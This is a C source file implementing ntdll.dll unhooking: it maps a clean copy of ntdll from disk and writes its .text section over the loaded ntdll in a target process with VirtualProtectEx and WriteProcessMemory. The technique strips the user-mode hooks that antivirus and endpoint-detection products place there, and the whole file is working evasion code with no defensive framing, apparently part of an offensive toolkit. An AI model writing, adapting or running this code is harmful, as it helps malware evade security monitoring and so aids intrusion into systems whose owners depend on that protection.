#include "UnhookDLL.h"
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

bool UnhookDLL(HANDLE hProcess, SyscallStruct* St) {
    // Load a fresh copy of ntdll.dll from disk
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open fresh ntdll.dll\n");
        return false;
    }

    // Create a file mapping
    HANDLE hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hFileMapping) {
        printf("[!] Failed to create file mapping for ntdll.dll\n");
        CloseHandle(hFile);
        return false;
    }

    // Map the file into the current process's memory
    LPVOID pMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {
        printf("[!] Failed to map ntdll.dll\n");
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        return false;
    }

    // Get the base address of ntdll.dll in the remote process
    HMODULE hRemoteNtdll = GetModuleHandleA("ntdll.dll");
    if (!hRemoteNtdll) {
        printf("[!] Failed to get ntdll.dll base address in remote process\n");
        UnmapViewOfFile(pMapping);
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        return false;
    }

    // Copy the .text section from the mapped fresh ntdll.dll into the remote process
    PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pImgDOSHead->e_lfanew);

    for (int i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) +
            (i * sizeof(IMAGE_SECTION_HEADER)));

        // We are only interested in the .text section
        if (!strcmp((char*)pImgSectionHead->Name, ".text")) {
            // Change memory protection to allow writing to the .text section
            DWORD oldProtect;
            VirtualProtectEx(hProcess, (LPVOID)((DWORD_PTR)hRemoteNtdll + pImgSectionHead->VirtualAddress),
                pImgSectionHead->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);

            // Copy the .text section from the fresh copy of ntdll.dll
            WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)hRemoteNtdll + pImgSectionHead->VirtualAddress),
                (LPVOID)((DWORD_PTR)pMapping + pImgSectionHead->VirtualAddress),
                pImgSectionHead->Misc.VirtualSize, NULL);

            // Restore the original memory protection
            VirtualProtectEx(hProcess, (LPVOID)((DWORD_PTR)hRemoteNtdll + pImgSectionHead->VirtualAddress),
                pImgSectionHead->Misc.VirtualSize, oldProtect, &oldProtect);
        }
    }

    // Clean up
    UnmapViewOfFile(pMapping);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);

    printf("[+] Successfully unhooked ntdll.dll in the remote process.\n");
    return true;
}
